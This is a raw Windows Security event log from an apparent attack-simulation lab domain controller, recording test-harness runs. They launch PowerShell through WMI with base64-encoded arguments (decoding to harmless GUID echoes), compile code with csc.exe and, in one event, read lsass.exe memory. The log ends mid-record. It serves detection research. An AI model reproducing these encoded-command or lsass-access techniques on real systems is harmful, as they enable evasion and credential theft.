	Process Command Line:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\2\RES36A.tmp" "c:\Users\Administrator\AppData\Local\Temp\2\qjia4v1n\CSC592915932CD14907B29FCB24DDD754AC.TMP"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382566
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0xa10
	Process Name:	C:\Windows\System32\dllhost.exe
	Exit Status:	0x0
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382565
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2044
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1998
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\2\qjia4v1n\qjia4v1n.cmdline"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382564
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1998
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382563
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		51662
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382562
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		51662
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382561
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55165
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382560
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55165
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382585
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\NETWORK SERVICE
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E4

Target Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	New Process ID:		0xc1c
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1ad4
	Creator Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
	Process Command Line:	powershell.exe -NoProfile -EA PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AcABvAHcAZQByAHMAaABlAGwAbAAvADIAMAAwADQALwAwADQAIgA+AA0ACgAgACAAPABPAGIAagAgAFIAZQBmAEkAZAA9ACIAMAAiAD4ADQAKACAAIAAgACAAPABUAE4AIABSAGUAZgBJAGQAPQAiADAAIgA+AA0ACgAgACAAIAAgACAAIAA8AFQAPgBTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAEEAcgByAGEAeQBMAGkAcwB0ADwALwBUAD4ADQAKACAAIAAgACAAIAAgADwAVAA+AFMAeQBzAHQAZQBtAC4ATwBiAGoAZQBjAHQAPAAvAFQAPgANAAoAIAAgACAAIAA8AC8AVABOAD4ADQAKACAAIAAgACAAPABMAFMAVAA+AA0ACgAgACAAIAAgACAAIAA8AFMAPgA4AGQANgAyADUAZAA3AGUALQA5ADUAOABkAC0ANAA0ADgANwAtADkAMAAwADcALQA5AGUAZQBhADMAOQBhADEANQBjAGEAZgA8AC8AUwA+AA0ACgAgACAAIAAgADwALwBMAFMAVAA+AA0ACgAgACAAPAAvAE8AYgBqAD4ADQAKADwALwBPAGIAagBzAD4A -C Write-Host $args[0]

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382584
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x12d8
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Exit Status:	0x0
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382583
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0xc58
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Exit Status:	0x0
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382582
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xc58
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x12d8
	Creator Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Process Command Line:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\2\RES6E5.tmp" "c:\Users\Administrator\AppData\Local\Temp\2\201oidti\CSCF2D18528948D46CEAF2E46DDC46B953F.TMP"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382581
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x12d8
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1f74
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\2\201oidti\201oidti.cmdline"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382580
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1478
	Process Name:	C:\Windows\System32\conhost.exe
	Exit Status:	0x0
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382579
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x2114
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382578
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1f74
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382577
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1998
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382576
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Section
	Object Name:	\Sessions\2\BaseNamedObjects\SessionImmersiveColorPreference
	Object Handle:	0x1a0

Process Information:
	Process ID:	0x1478
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query section state
				Map section for write
				Map section for read
				Map section for execute
				Extend size
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382575
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	-
	Object Name:	-
	Object Handle:	0x19c

Process Information:
	Process ID:	0x1478
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	2031617
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382574
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Mutant
	Object Name:	\Sessions\2\BaseNamedObjects\SessionImmersiveColorMutex
	Object Handle:	0x19c

Process Information:
	Process ID:	0x1478
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				SYNCHRONIZE
				Query mutant state
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382573
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x2e8
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382572
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	File
	Object Name:	\Device\ConDrv
	Object Handle:	0x4

Process Information:
	Process ID:	0x1478
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				SYNCHRONIZE
				ReadData (or ListDirectory)
				WriteData (or AddFile)
				AppendData (or AddSubdirectory or CreatePipeInstance)
				ReadEA
				WriteEA
				Execute/Traverse
				DeleteChild
				ReadAttributes
				WriteAttributes
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382571
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1478
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x2114
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382570
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\NETWORK SERVICE
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E4

Target Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	New Process ID:		0x2114
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1ad4
	Creator Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
	Process Command Line:	powershell.exe -NoProfile -C Write-Host fc447306-6645-4777-bd13-8f6d9f2743bf

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382603
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	File
	Object Name:	\Device\ConDrv
	Object Handle:	0x4

Process Information:
	Process ID:	0x1a6c
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				SYNCHRONIZE
				ReadData (or ListDirectory)
				WriteData (or AddFile)
				AppendData (or AddSubdirectory or CreatePipeInstance)
				ReadEA
				WriteEA
				Execute/Traverse
				DeleteChild
				ReadAttributes
				WriteAttributes
				
	Privileges:		SeTakeOwnershipPrivilege
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382602
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1a6c
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x2174
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382601
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\NETWORK SERVICE
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E4

Target Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	New Process ID:		0x2174
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1ad4
	Creator Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
	Process Command Line:	powershell.exe -NoProfile -E VwByAGkAdABlAC0ASABvAHMAdAAgAGUAZgA2ADAAZABkADEAOQAtAGUAZABhADIALQA0ADAANQBmAC0AOABkADUAZgAtADUAOAA2ADIAYQAyAGQAYQBlADEAYgA5AA==

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:48 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
